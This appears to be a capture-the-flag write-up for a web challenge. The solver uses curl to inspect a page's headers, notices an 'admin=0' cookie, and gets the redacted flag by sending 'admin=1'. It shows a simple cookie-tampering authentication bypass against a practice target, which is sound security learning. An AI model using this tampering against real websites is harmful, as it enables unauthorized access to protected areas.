http://hack.bckdr.in/CKK/index.php

Let's check out the page:

```
$ curl http://hack.bckdr.in/CKK/index.php
<html>
	<head>
	</head>
	<body>
		<div>
		Authorizes Persons Only
		</div>
	</body>
</html>
```

And let's make a `HEAD` request to get the headers:

```
$ curl -I http://hack.bckdr.in/CKK/index.php
HTTP/1.1 200 OK
Date: Tue, 11 Oct 2016 22:10:45 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.17
Set-Cookie: admin=0
Content-Type: text/html
```

Hmm, the `admin` cookie looks interesting...

```
$ curl -b admin=1 http://hack.bckdr.in/CKK/index.php

<html>
	<head>
	</head>
	<body>
		<div>
			flag is <redacted>
		</div>
	</body>
</html>
```

Boom!
